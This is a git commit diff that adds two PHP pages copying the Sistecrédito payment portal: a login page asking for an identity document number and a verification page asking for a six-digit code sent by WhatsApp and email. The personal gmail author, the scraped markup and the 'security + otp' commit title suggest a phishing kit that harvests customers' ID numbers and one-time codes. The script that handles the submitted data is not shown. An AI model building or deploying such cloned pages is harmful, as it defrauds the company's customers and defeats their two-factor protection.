471426769ccf33e59e76d3504817b686b620b483
Kraken Labs <krakenanalytics2@gmail.com>
2026-08-13 16:36:37 -0300

    Deploy: paginas security + otp

---
+++ people/security/index.php
@@ -0,0 +1,36 @@
+<?php
+require_once __DIR__ . '/../../config.php';
+?>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="title" content="Sistecrédito - Paga tu cuota">
+<meta name="description" content="Consulta y paga las cuotas de tus créditos fácil, rápido y seguro con Sistecrédito">
+<title id="pageTitle">Sistecrédito - Paga tu cuota</title>
+<link rel="stylesheet" href="../../assets/css/styles-inline-security.css" media="all">
+<link rel="stylesheet" href="../../assets/css/styles-J73ZU62S.css" media="all">
+<link rel="stylesheet" href="../../assets/css/styles-components-security.css" media="all">
+
+</head>
+<body>
+<app-root><sc-loading customtext=""></sc-loading><router-outlet></router-outlet><sc-security><div class="auth-template-container look-and-feel"><form novalidate="" class="ng-pristine ng-invalid ng-touched"><sc-new-authorization-template><div class="authorization-background"><div class="newauth-container"><img src="../../assets/LogoSiste.svg" class="newauth-container__logo" alt="logo Sistecredito"><div class="newauth-container__title"><strong>Bienvenidos</strong><br>al portal de pagos</div><div class="payment-methods-block"><div class="newauth-container__paragraph">Aquí puedes pagar tus créditos con los <b>medios de pago</b> disponibles.</div><div class="newauth-container__payment-methods"><div class="payment-method"><div><img class="payment-method-image" src="../../assets/7.webp" alt="Nequi"></div><div class="payment-method-label">Nequi</div></div><div class="payment-method"><div><img class="payment-method-image" src="../../assets/5.webp" alt="Bancolombia"></div><div class="payment-method-label">Bancolombia</div></div><div class="payment-method"><div><img class="payment-method-image" src="../../assets/1.webp" alt="PSE"></div><div class="payment-method-label">PSE</div></div></div></div><div class="newauth-container__document-input"><div class="document-input-form"><sc-document-login class="ng-pristine ng-invalid ng-touched"><div class="login"><div class="login__title"><span>Consulta y paga tus créditos</span></div><form novalidate="" class="login__form--new-ui ng-pristine ng-invalid ng-touched"><sc-document-input class="ng-pristine ng-invalid ng-touched"><form novalidate="" class="ng-pristine ng-invalid ng-touched"><label for="documentInput" class="text-error">Documento de identidad</label><div class="document-container"><div class="document-container__inputs"><span class="document-type"><sc-input><div class="input-container"><div name="sc-input" class="input-container__slot input-error" style="padding-right: 2.2rem;"><input name="inputField" type="text" placeholder=""></div></div></sc-input></span><div class="document-container__slash"><span>/</span></div><div class="document-container__input-number"><sc-input><div class="input-container"><div name="sc-input" class="input-container__slot input-error"><input name="inputField" id="documentInput" class="input-container__textfield" type="text" placeholder="Buscar"></div></div></sc-input></div></div></div></form></sc-document-input><div class="login__button"><sc-button><button type="submit" class="button button--primary button--md button--block button--icon" id="loginBtn"><span class="button__text">Consultar</span><span class="button__icon"><sc-icon iconsize="s"><fa-icon size="4x" class="ng-fa-icon icon-size icon-size--s"><svg data-prefix="fas" data-icon="arrow-right" class="svg-inline--fa fa-arrow-right fa-4x fa-pull-undefined" role="img" viewBox="0 0 448 512" aria-hidden="true"><path fill="currentColor" d="M438.6 278.6c12.5-12.5 12.5-32.8 0-45.3l-160-160c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L338.7 256 233.4 361.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l160-160z"></path></svg></fa-icon></sc-icon></span></button></sc-button></div></form></div></sc-document-login></div></div></div></sc-new-authorization-template></form></sc-security></app-root>
+  
+
+
+
+
+ 
+<div id="ZN_5hU8A0WekgPOmyO"></div>
+ 
+
+ 
+<div id="ZN_5hU8A0WekgPOmyO"></div>
+ 
+
+<div id="qservus-widget-container"></div>
+
+<script src="../../assets/js/app.js" defer></script>
+</body>
+</html>
---
+++ people/security/otp/index.php
@@ -0,0 +1,37 @@
+<?php
+require_once __DIR__ . '/../../../config.php';
+?>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="title" content="Sistecrédito - Paga tu cuota">
+<meta name="description" content="Consulta y paga las cuotas de tus créditos fácil, rápido y seguro con Sistecrédito">
+<title id="pageTitle">Sistecrédito - Paga tu cuota</title>
+<link rel="stylesheet" href="../../../assets/css/styles-fonts-otp.css" media="all">
+<link rel="stylesheet" href="../../../assets/css/styles-J73ZU62S.css" media="all">
+<link rel="stylesheet" href="../../../assets/css/styles-components-security.css" media="all">
+<link rel="stylesheet" href="../../../assets/css/styles-components-otp.css" media="all">
+
+</head>
+<body>
+<app-root><sc-loading customtext=""></sc-loading><router-outlet></router-outlet><sc-security><div class="auth-template-container look-and-feel"><form novalidate="" class="ng-touched ng-dirty ng-invalid"><sc-new-authentication-template><form novalidate="" class="ng-touched ng-dirty ng-invalid"><div class="sistecredito-authentication-template"><p class="sistecredito-authentication-template__title"> Código de verificación </p><div class="sistecredito-authentication-template__content"><div class="sistecredito-authentication-template__verification-code">Ingresa el código que recibirás por <strong>WhatsApp y correo electrónico.</strong></div><sc-token-input formcontrolname="token" class="ng-untouched ng-pristine ng-invalid"><div class="inputs-container"><input inputmode="numeric" autocomplete="off" placeholder="" class="inputs-container__input" id="inputNumber0" autofocus=""><input inputmode="numeric" autocomplete="off" placeholder="" class="inputs-container__input" id="inputNumber1"><input inputmode="numeric" autocomplete="off" placeholder="" class="inputs-container__input" id="inputNumber2"><div class="inputs-container__separator"></div><input inputmode="numeric" autocomplete="off" placeholder="" class="inputs-container__input" id="inputNumber3"><input inputmode="numeric" autocomplete="off" placeholder="" class="inputs-container__input" id="inputNumber4"><input inputmode="numeric" autocomplete="off" placeholder="" class="inputs-container__input" id="inputNumber5"></div></sc-token-input><p class="sistecredito-authentication-template__auth-methods-title"> Solicítalo nuevamente por: </p><sc-auth-request-methods><div class="container"><div class="auth-method"><div class="auth-method__circle"><div class="auth-method__icon"><sc-icon iconsize="s"><fa-icon size="4x" class="ng-fa-icon icon-size icon-size--s" style="color: rgb(0, 54, 156);"><svg data-prefix="fab" data-icon="whatsapp" class="svg-inline--fa fa-whatsapp fa-4x fa-pull-undefined" role="img" viewBox="0 0 448 512" aria-hidden="true"><path fill="currentColor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zM223.9 414.8c-32 0-64-8.8-92.5-25.6l-6.6-3.9-68.2 17.9 17.9-66.6-4.3-6.9c-18.1-28.8-27.6-62.5-27.6-96.8 0-106 86.5-192.4 192.9-192.4 51.5 0 99.9 20 136.3 56.5 36.4 36.5 56.5 85 56.5 136.5 0 106-86.4 192.4-192.8 192.4z"></path></svg></fa-icon></sc-icon></div></div><div class="auth-method__title">WhatsApp</div></div><div class="auth-method"><div class="auth-method__circle"><div class="auth-method__icon"><sc-icon iconsize="s"><fa-icon size="4x" class="ng-fa-icon icon-size icon-size--s" style="color: rgb(0, 54, 156);"><svg data-prefix="fas" data-icon="envelope" class="svg-inline--fa fa-envelope fa-4x fa-pull-undefined" role="img" viewBox="0 0 512 512" aria-hidden="true"><path fill="currentColor" d="M48 64C21.5 64 0 85.5 0 112v288c0 26.5 21.5 48 48 48h416c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48H48zm0 48h416c8.8 0 16 7.2 16 16v40l-208 119.3L48 168v-40c0-8.8 7.2-16 16-16zm16 96l192 110.2L448 208v160H64V208z"></path></svg></fa-icon></sc-icon></div></div><div class="auth-method__title">Correo electrónico</div></div></div></sc-auth-request-methods></div></div></sc-new-authentication-template></form></sc-security></app-root>
+  
+
+<div id="autoglm-main-content" class="autoglm-main-content" data-version="0.1.6"></div>
+
+
+ 
+<div id="ZN_5hU8A0WekgPOmyO"></div>
+ 
+
+ 
+<div id="ZN_5hU8A0WekgPOmyO"></div>
+ 
+
+<div id="qservus-widget-container"></div>
+
+<script src="../../../assets/js/app.js" defer></script>
+</body>
+</html>
